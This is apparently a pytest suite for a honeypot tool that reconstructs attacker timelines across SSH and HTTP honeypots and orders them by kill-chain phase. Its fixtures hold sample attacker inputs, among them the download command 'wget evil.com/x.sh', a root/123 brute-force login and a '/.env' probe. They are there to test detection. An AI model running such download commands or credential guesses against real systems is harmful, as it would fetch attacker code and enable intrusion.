"""Tests for analyze_attacker_journey.

Verifies the multi-honeypot timeline reconstruction: events are pulled across
honeypots, mapped to MITRE phases, ordered by kill-chain progression, and
phase transitions are surfaced.
"""

import os
from datetime import datetime, timedelta, timezone

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage.database import close_db, init_db
    await init_db()
    yield
    await close_db()


async def _add_alert(ip, event_type, payload, hp_id=None, minutes_ago=10, severity="high"):
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    ts = datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
    async with get_session() as session:
        session.add(Alert(
            honeypot_id=hp_id,
            source_ip=ip,
            source_port=None,
            event_type=event_type,
            payload=payload,
            severity=AlertSeverity(severity),
            timestamp=ts,
        ))


async def _add_honeypot(name, hp_type, port):
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeypot, HoneypotType

    async with get_session() as session:
        hp = Honeypot(name=name, type=HoneypotType(hp_type), port=port)
        session.add(hp)
        await session.flush()
        return hp.id


@pytest.mark.asyncio
async def test_journey_returns_empty_for_unknown_ip():
    from honeypot_mcp.tools.analysis import analyze_attacker_journey

    out = await analyze_attacker_journey("99.99.99.99", hours=24)
    assert out["total_alerts"] == 0
    assert "No activity" in out["summary"]


@pytest.mark.asyncio
async def test_journey_reconstructs_multi_honeypot_timeline():
    from honeypot_mcp.tools.analysis import analyze_attacker_journey

    ssh_id = await _add_honeypot("ssh-honey", "ssh", 2222)
    http_id = await _add_honeypot("http-honey", "http", 8080)

    ip = "5.6.7.8"
    # Recon phase — port scan / web scan
    await _add_alert(ip, "web_scan", {"path": "/.env"}, hp_id=http_id, minutes_ago=30)
    # Initial Access — SSH brute force
    await _add_alert(ip, "ssh_login_failed", {"username": "root", "password": "123"}, hp_id=ssh_id, minutes_ago=20)
    # Execution — command run
    await _add_alert(ip, "ssh_command_input", {"input": "wget evil.com/x.sh"}, hp_id=ssh_id, minutes_ago=10)

    out = await analyze_attacker_journey(ip, hours=24)
    assert out["total_alerts"] == 3
    assert "ssh-honey" in out["honeypots_touched"]
    assert "http-honey" in out["honeypots_touched"]
    # We should have multiple phases, in kill-chain order
    phase_names = [p["phase"] for p in out["phases"]]
    assert len(phase_names) >= 2
    # Initial Access must precede Execution if both present
    if "Initial Access" in phase_names and "Execution" in phase_names:
        assert phase_names.index("Initial Access") < phase_names.index("Execution")
    # Phase progression should appear in the summary
    assert "phase progression" in out["summary"].lower()


@pytest.mark.asyncio
async def test_journey_records_phase_transitions():
    from honeypot_mcp.tools.analysis import analyze_attacker_journey

    ssh_id = await _add_honeypot("ssh-honey", "ssh", 2222)

    ip = "1.2.3.4"
    await _add_alert(ip, "ssh_login_failed", {"username": "admin", "password": "x"}, hp_id=ssh_id, minutes_ago=15)
    await _add_alert(ip, "ssh_command_input", {"input": "ls /"}, hp_id=ssh_id, minutes_ago=5)

    out = await analyze_attacker_journey(ip, hours=24)
    transitions = out["transitions"]
    assert len(transitions) >= 1
    # The transition should record the trigger event_type
    assert any(t["via"] in ("ssh_command_input", "ssh_login_failed") for t in transitions)


@pytest.mark.asyncio
async def test_journey_caps_chronological_output():
    from honeypot_mcp.tools.analysis import analyze_attacker_journey

    ssh_id = await _add_honeypot("ssh-honey", "ssh", 2222)
    ip = "7.7.7.7"
    # 250 events — chronological list should cap at 200
    for i in range(250):
        await _add_alert(ip, "ssh_login_failed", {"attempt": i}, hp_id=ssh_id, minutes_ago=60 - (i * 0.1))

    out = await analyze_attacker_journey(ip, hours=24)
    assert out["total_alerts"] == 250
    assert len(out["chronological"]) == 200
